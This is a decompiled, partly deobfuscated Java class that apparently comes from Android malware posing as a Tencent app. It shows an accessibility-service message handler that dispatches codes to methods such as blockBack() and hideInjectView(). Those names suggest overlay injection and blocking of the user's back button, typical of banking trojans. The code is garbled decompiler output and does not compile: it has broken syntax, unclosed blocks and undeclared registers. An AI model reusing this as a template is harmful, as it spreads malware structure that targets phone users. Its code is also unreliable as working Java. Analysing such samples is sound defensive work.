package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AccessibilityServiceCore_19
 * Original: Lcom/tencent/tunesxconcerningn1012$19;
 */
class AccessibilityServiceCore_19 implements Handler$Callback; {

    // === FIELDS ===
    final AccessibilityServiceCore this$0;

    // === METHODS ===

     void Constructor(AccessibilityServiceCore param0) {
        v0.this$0 = v1;
        // new Object()
        return;
    }

    public boolean handleMessage(Message param0) {
        v0 = v3.arg1;
        v3 = v3.what;
        v1 = 1;
        if (v3 == 1) { // goto +57
        v1 = 2;
        if (v3 == 2) { // goto +48
        v1 = 3;
        if (v3 == 3) { // goto +39
        v1 = 4;
        if (v3 == 4) { // goto +30
        v1 = 5;
        if (v3 == 5) { // goto +21
        v0 = 15;
        if (v3 == 15) { // goto +13
        v0 = 800;
        if (v3 == 800) { // goto +3
        // goto (branch)
        v3 = v2.this$0;
        v3.tunesxconcerningn1012blockBack();
        // goto (branch)
        Bin_tunesxconcerningn10_ance.hideInjectView();
        // goto (branch)
        v3 = v2.this$0;
        AccessibilityServiceCore.access$1000(v3, 800);
        // goto (branch)
        v3 = v2.this$0;
        AccessibilityServiceCore.access$900(v3);
        // goto (branch)
        v3 = v2.this$0;
        AccessibilityServiceCore.access$800(v3);
        // goto (branch)
        v3 = v2.this$0;
        AccessibilityServiceCore.access$700(v3);
        // goto (branch)
        v3 = v2.this$0;
        AccessibilityServiceCore.access$600(v3);
        v3 = 0;
        return 0;
    }
}
